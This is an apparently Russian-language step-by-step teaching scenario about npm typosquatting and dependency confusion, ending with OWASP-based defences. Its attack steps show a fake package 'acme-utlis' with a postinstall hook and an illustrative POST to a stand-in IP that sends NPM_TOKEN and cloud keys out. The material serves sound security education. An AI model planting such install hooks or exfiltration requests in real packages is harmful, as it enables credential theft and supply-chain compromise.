## Шаги

### `publish` Пакет с похожим именем

`attacker → registry` · `attack` · `icon:document`
Сообщение: acme-utlis 1.0.0 · Итог: опубликован

```json
{
  "name": "⟦acme-utlis⟧",
  "scripts": { "postinstall": "⟦node collect.js⟧" }
}
```

#### Просто

Есть популярная библиотека `acme-utils`. Атакующий публикует в открытом реестре пакет
`acme-utlis` — две буквы переставлены. С виду обычная библиотека, внутри вредный код.

#### По шагам

В открытом реестре пакет может опубликовать любой зарегистрированный пользователь. Атакующий выбирает имя, которое легко набрать по ошибке, и копирует описание
настоящего пакета.

#### Глубже

Такой приём называют **typosquatting**. В MITRE ATT&CK он упомянут в подтехнике T1195.001
«Compromise Software Dependencies and Development Tools» вместе с подменой популярных открытых
пакетов и перерегистрацией заброшенных. Шпаргалка OWASP по npm описывает и новую разновидность:
имена пакетов, которые выдумывает ИИ-помощник, а атакующий регистрирует заранее.

### `typo` Опечатка разработчика

`dev → mirror` · `legit`
Сообщение: acme-utlis · Итог: запрос ушёл

```text
$ npm install ⟦acme-utlis⟧
```

#### Просто

Разработчик хочет добавить в проект `acme-utils`, но торопится и набирает имя с опечаткой.
Команда не ругается: пакет с таким именем существует.

#### По шагам

Запрос идёт во внутренний реестр компании, а тот, если пакета у него нет, спрашивает открытый
реестр. Для программы это обычная установка новой **зависимости**.

#### Глубже

Зависимость — чужой код, на котором держится твой проект. У современного проекта их сотни, и у
каждой — свои зависимости. OWASP A06:2021 начинает список признаков уязвимости с того, что вы не
знаете версий всех компонентов, включая вложенные зависимости.

### `deliver` Реестр отдаёт подделку

`registry → mirror` · `attack` · `without-defence`
Сообщение: acme-utlis · Итог: пропущен

#### Просто

Внутренний реестр работает как простой посредник: что пришло из открытого реестра, то и отдаёт.
Поддельный пакет проходит без вопросов.

#### По шагам

Посредник ускоряет установку и кэширует пакеты, но не решает, каким пакетам можно доверять.
Любое имя из открытого реестра для него так же хорошо, как настоящее.

#### Глубже

Родственная атака — путаница зависимостей (dependency confusion). Атакующий узнаёт имя
внутреннего пакета компании, например из утёкшего файла проекта или вакансии, и публикует в
открытом реестре пакет с тем же именем и большим номером версии. Если инструмент ищет пакет в
обоих местах, он может выбрать публичную «новинку». OWASP советует пространство имён компании
(`@acme/…`), привязанное к своему реестру, и заглушки с теми же именами в открытом реестре.

### `install` Скрипт установки

`mirror → dev` · `attack` · `without-defence`
Сообщение: acme-utlis · Итог: скрипт запущен

```text
> acme-utlis 1.0.0, postinstall
> ⟦node collect.js⟧
```

#### Просто

Пакет ставится, и сразу же запускается его **скрипт установки**. Разработчик ещё не написал ни
строчки с новой библиотекой, а её код уже работает на его компьютере.

#### По шагам

Пакеты npm могут объявить скрипты, которые выполняются при установке. Они работают с правами
разработчика: видят его файлы, переменные окружения и сеть.

#### Глубже

Шпаргалка OWASP по npm советует по умолчанию не запускать скрипты при установке: флаг
`--ignore-scripts` или строка `ignore-scripts=true` в `.npmrc`, а нужные пакеты разрешать по
списку. Там же оговорка: это лишь откладывает запуск, ведь `npm test` и `npm start` всё равно
запускают скрипты. А код самой библиотеки выполнится, как только проект её вызовет.

### `steal` Токены уходят атакующему

`dev → attacker` · `attack` · `without-defence`
Сообщение: токены и ключи · Итог: украдены

```text
POST https://203.0.113.66/c
⟦NPM_TOKEN=…  CLOUD_KEY=…⟧
```

#### Просто

Скрипт собирает **секреты** разработчика — токены и ключи доступа — и отправляет атакующему.
Теперь тот может действовать от имени разработчика.

#### По шагам

Любой пакет может прочитать переменные окружения, а там часто лежат токены публикации и ключи
облака. С токеном публикации атакующий выпустит вредную версию уже настоящей библиотеки.

#### Глубже

Шпаргалка OWASP отмечает, что любой пакет читает переменные окружения через `process.env`, и
поэтому учётные данные — частая цель. Она советует короткоживущие токены с минимальными правами,
доступ только на чтение для установки и второй фактор для публикации. Через украденный токен
атака на одного разработчика становится атакой на цепочку поставок.

### `vet` Пакета нет в проверенном списке

`registry → mirror` · `attack` · `with-defence` · `stopped`
Сообщение: acme-utlis · Итог: остановлено

```text
acme-utlis   ⟦нет в списке одобренных⟧ → отказ
acme-utils   одобрен, версия 3.2.0
```

#### Просто

Теперь свой реестр отдаёт только пакеты, которые компания проверила и одобрила. Пакета
`acme-utlis` в этом списке нет, и он до разработчика не доходит.

#### По шагам

Новая зависимость попадает в список только после проверки: кто автор, сколько лет пакету,
сколько у него пользователей, что делают скрипты установки. Имя с опечаткой этот путь не пройдёт.

#### Глубже

OWASP A08:2021 советует брать библиотеки только из доверенных репозиториев, а при высоком риске —
держать свой проверенный репозиторий. A06:2021 добавляет: брать компоненты только из
официальных источников по защищённым каналам, предпочитать подписанные пакеты и удалять
неиспользуемые зависимости.

### `right` Установка по lock-файлу

`mirror → dev` · `safe` · `with-defence`
Сообщение: acme-utils · Итог: установлено

```text
$ npm install acme-utils --ignore-scripts
acme-utils 3.2.0  записан в package-lock.json
```

#### Просто

Разработчик видит отказ, замечает опечатку и ставит настоящий пакет. Точная версия пакета
записана в **lock-файл**, поэтому у всех в команде ставится ровно он.

#### По шагам

Lock-файл хранит точные версии всех зависимостей, включая вложенные. Коллеги и сервер сборки
ставят их командой `npm ci` строго по нему, скрипты установки выключены.

#### Глубже

Шпаргалка OWASP по npm советует хранить lock-файл в репозитории и ставить зависимости через
`npm ci`: при любом расхождении с lock-файлом установка прерывается. Lock-файл не спасает от
опечатки в новой зависимости, но не даёт тихо подменить уже проверенную.

## Как защититься

- **Свой проверенный реестр.** Разработчики и сборка ставят пакеты только из внутреннего
  реестра с одобренным списком, а не напрямую из открытого.
- **Lock-файл и `npm ci`.** Точные версии всех зависимостей в репозитории; установка
  прерывается при расхождении.
- **Не запускайте скрипты установки по умолчанию.** `--ignore-scripts`, а нужные пакеты — по
  списку разрешённых.
- **Проверяйте имя перед установкой.** Автор, возраст и популярность пакета; особенно — для имён,
  которые предложил ИИ-помощник.
- **Пространство имён для своих пакетов**, привязанное к своему реестру, против путаницы
  зависимостей.
- **Минимум секретов на машине разработчика.** Короткоживущие токены с узкими правами, второй
  фактор на публикацию.
- **Опись и обновление зависимостей.** Знайте, что стоит в проекте, удаляйте лишнее, следите за
  уязвимостями в используемых компонентах.
